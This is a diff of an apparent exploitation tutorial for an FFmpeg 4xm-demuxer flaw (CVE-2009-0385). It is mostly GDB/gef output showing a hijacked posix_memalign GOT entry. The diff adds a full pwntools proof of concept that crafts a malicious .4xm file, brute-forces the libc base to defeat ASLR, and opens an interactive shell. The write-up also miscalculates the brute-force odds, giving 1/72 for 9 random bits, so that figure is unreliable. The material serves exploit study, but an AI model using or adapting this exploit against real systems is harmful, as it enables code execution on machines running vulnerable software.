@@ -620,7 +620,7 @@ FFmpeg version git-6a5d31a, Copyright (c) 2000-2009 Fabrice Bellard, et al.
 Breakpoint 4, 0x080aaeec in fourxm_read_header (s=0x881d330, ap=0xffffd350) at libavformat/4xm.c:178
 178     in libavformat/4xm.c
 [ Legend: Modified register | Code | Heap | Stack | String ]
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
+───────────────────────────────────────────────────────[ registers ]────
 $eax   : 0x084ef134  →  0xf7e11310  →  <posix_memalign+0> push ebx
 $ebx   : 0x00000128
 $ecx   : 0x084ef134  →  0xf7e11310  →  <posix_memalign+0> push ebx
@@ -632,7 +632,7 @@ $edi   : 0x088263c0  →  0x00000280
 $eip   : 0x080aaeec  →  <fourxm_read_header+668> mov DWORD PTR [esp+0x20], ecx
 $eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
+───────────────────────────────────────────────────────────[ stack ]────
 0xffffd1a0│+0x00: 0x00000004     ← $esp
 0xffffd1a4│+0x04: 0x0000003c ("<"?)
 0xffffd1a8│+0x08: 0x00000001
@@ -641,7 +641,7 @@ $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
 0xffffd1b4│+0x14: 0xf7ec3c5d  →  <__memset_sse2_rep+269> add ebx, 0x3dc83
 0xffffd1b8│+0x18: 0x088263c0  →  0x00000280
 0xffffd1bc│+0x1c: 0x000002e6
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
+───────────────────────────────────────────────────────[ code:i386 ]────
     0x80aaedf <fourxm_read_header+655> lea    edx, [ebp+ebp*4+0x0]
     0x80aaee3 <fourxm_read_header+659> lea    ecx, [edx*4+0x0]
     0x80aaeea <fourxm_read_header+666> add    eax, ecx
@@ -651,16 +651,16 @@ $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
     0x80aaef8 <fourxm_read_header+680> mov    DWORD PTR [eax+0x10], ecx
     0x80aaefb <fourxm_read_header+683> mov    ecx, DWORD PTR [esi+ebx*1+0x24]
     0x80aaeff <fourxm_read_header+687> mov    DWORD PTR [eax+0x8], ecx
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
+─────────────────────────────────────────────────────────[ threads ]────
 [#0] Id 1, Name: "ffmpeg", stopped, reason: BREAKPOINT
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+───────────────────────────────────────────────────────────[ trace ]────
 [#0] 0x80aaeec → Name: fourxm_read_header(s=0x881d330, ap=0xffffd350)
 [#1] 0x8083069 → Name: av_open_input_stream(ic_ptr=0xffffd34c, pb=0x8826340, filename=0xffffd70f "dracula.4xm", fmt=0x84f0fe0 <fourxm_demuxer>, ap=0xffffd350)
 [#2] 0x808b0d4 → Name: av_open_input_file(ic_ptr=0xffffd34c, filename=0xffffd70f "dracula.4xm", fmt=0x84f0fe0 <fourxm_demuxer>, buf_size=0x0, ap=0xffffd350)
 [#3] 0x807b335 → Name: opt_input_file(filename=<optimized out>)
 [#4] 0x807c983 → Name: parse_options(argc=0x3, argv=0xffffd584, options=0x83f5560 <options>, parse_arg_function=0x807a3e0 <opt_output_file>)
 [#5] 0x8073326 → Name: main(argc=0x3, argv=0xffffd584)
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────
 gef➤  enable 6
 gef➤  c
 Continuing.
@@ -668,7 +668,7 @@ Continuing.
 Breakpoint 6, 0x083f073e in av_malloc (size=0x164) at libavutil/mem.c:62
 62      libavutil/mem.c: No such file or directory.
 [ Legend: Modified register | Code | Heap | Stack | String ]
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
+───────────────────────────────────────────────────────[ registers ]────
 $eax   : 0xffffd15c  →  0x00000000
 $ebx   : 0x00000000
 $ecx   : 0x00000010
@@ -680,7 +680,7 @@ $edi   : 0x088263c0  →  0x00000280
 $eip   : 0x083f073e  →  <av_mallocz+46> call 0x805b910 <posix_memalign@plt>
 $eflags: [CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
+───────────────────────────────────────────────────────────[ stack ]────
 0xffffd140│+0x00: 0xffffd15c  →  0x00000000      ← $esp
 0xffffd144│+0x04: 0x00000010
 0xffffd148│+0x08: 0x00000164
@@ -689,7 +689,7 @@ $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
 0xffffd154│+0x14: 0x088263c0  →  0x00000280
 0xffffd158│+0x18: 0x088268a0  →  0x08407a40  →  0x084069a0  →  "AVCodecContext"
 0xffffd15c│+0x1c: 0x00000000     ← $eax
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
+───────────────────────────────────────────────────────[ code:i386 ]────
     0x83f072f <av_mallocz+31>  mov    DWORD PTR [esp+0x8], esi
     0x83f0733 <av_mallocz+35>  mov    DWORD PTR [esp+0x4], 0x10
     0x83f073b <av_mallocz+43>  mov    DWORD PTR [esp], eax
@@ -700,15 +700,15 @@ $ds: 0x002b  $ss: 0x002b  $fs: 0x0000  $es: 0x002b  $gs: 0x0063  $cs: 0x0023
        0x805b920 <fcntl@plt+0>    jmp    DWORD PTR ds:0x84ef138
        0x805b926 <fcntl@plt+6>    push   0x258
        0x805b92b <fcntl@plt+11>   jmp    0x805b460
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ arguments (guessed) ]────
+─────────────────────────────────────────────[ arguments (guessed) ]────
 posix_memalign@plt (
    [sp + 0x0] = 0x00000010,
    [sp + 0x4] = 0x00000164,
    [sp + 0x8] = 0x00000010
 )
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
+─────────────────────────────────────────────────────────[ threads ]────
 [#0] Id 1, Name: "ffmpeg", stopped, reason: BREAKPOINT
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+───────────────────────────────────────────────────────────[ trace ]────
 [#0] 0x83f073e → Name: av_malloc(size=0x164)
 [#1] 0x83f073e → Name: av_mallocz(size=0x164)
 [#2] 0x8087f60 → Name: av_new_stream(s=0x881d330, id=0x8d3725a9)
@@ -718,7 +718,7 @@ posix_memalign@plt (
 [#6] 0x807b335 → Name: opt_input_file(filename=<optimized out>)
 [#7] 0x807c983 → Name: parse_options(argc=0x3, argv=0xffffd584, options=0x83f5560 <options>, parse_arg_function=0x807a3e0 <opt_output_file>)
 [#8] 0x8073326 → Name: main(argc=0x3, argv=0xffffd584)
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────
 gef➤  x/xw 0x84ef134
 0x84ef134 <posix_memalign@got.plt>:     0xffffffff
 gef➤
@@ -727,3 +727,102 @@ gef➤
 Great! Looks like we've confirmed that we can alter code execution. Now let's try and pop a shell while bypassing DEP and ASLR!
 
 ## Bypassing ASLR
+
+There are a few well known ways to bypass ASLR including information leaks and with 32 bit binaries; brute force. The number of random bits in a 32 bit address space on Ubuntu 16.04 can be calculated as follows:
+
+```
+run#1:
+0xf7da4000 0xf7f54000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+
+run#2:
+0xf7d23000 0xf7ed3000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+
+run#3:
+0xf7cdd000 0xf7e8d000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+
+run#4:
+0xf7d3e000 0xf7eee000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+
+gef➤  p/t 0xf7cdd000
+$1 = 11110111110011011101000000000000
+gef➤  p/t 0xf7d23000
+$2 = 11110111110100100011000000000000
+gef➤  p/t 0xf7da4000
+$3 = 11110111110110100100000000000000
+gef➤  p/t 0xf7d3e000
+$4 = 11110111110100111110000000000000
+```
+
+There are 9 random bit, if my math is correct (9! / (9 - 2)!): i'd have a 1/72 chance of guessing correctly. Here's my proof of concept code:
+
+```python
+#!/usr/bin/python
+# ffmpeg null ptr deref
+# cve-2009-0385
+# clampz
+# a bug hunter's diary : trapkit.de
+
+from pwn import *
+import sys
+import random
+
+def randlibc():
+    prefix = '11110111110'
+    suffix = '000000000000'
+    mid = ''
+    for i in range(0, 9):
+        mid += str( random.randint(0, 1) )
+    return int(prefix+mid+suffix,2)
+
+ffmpeg_path = './i686/ffmpeg/ffmpeg'
+
+pwned = False
+
+p = log.progress('ASLR bruteforcing: no match yet! fishsticks..')
+while pwned != True:
+    libc_base_guess = randlibc()
+    f = open('./dracula.4xm', 'w')
+
+    f.seek(0x148)
+    f.write(p32(0x8d3725a9))
+    f.seek(0x168)
+    f.write(p32(libc_base_guess+0x3ac8c))
+    f.close()
+
+    #import pdb; pdb.set_trace()
+    r = context.log_level
+    context.log_level = logging.CRITICAL
+    io = process([ffmpeg_path, '-i', './dracula.4xm'])
+    libc_base = io.libs()['/lib/i386-linux-gnu/libc.so.6']
+    if hex(libc_base_guess) == hex(libc_base):
+        sleep(1)
+        context.log_level = logging.INFO
+        sleep(.5)
+        log.success('got a match! {} == {}'.format(hex(libc_base_guess), hex(libc_base)))
+    else:
+        #log.failure('no match! {} != {}'.format(hex(io.libs()['/lib/i386-linux-gnu/libc.so.6']), hex(libc_base)))
+        sleep(.5)
+        io.close()
+        continue
+    try:
+        io.recv()
+        io.send('id')
+        b = io.recv()
+        log.info(b)
+        if 'Unknown format' in b:
+            sleep(.5)
+            io.close()
+            break
+    except EOFError:
+        sleep(.5)
+        io.close()
+        break
+#context.log_level = r
+if context.log_level == logging.CRITICAL:
+    sys.exit(2)
+io.interactive()
+```
+
+## Bypassing DEP
+
+
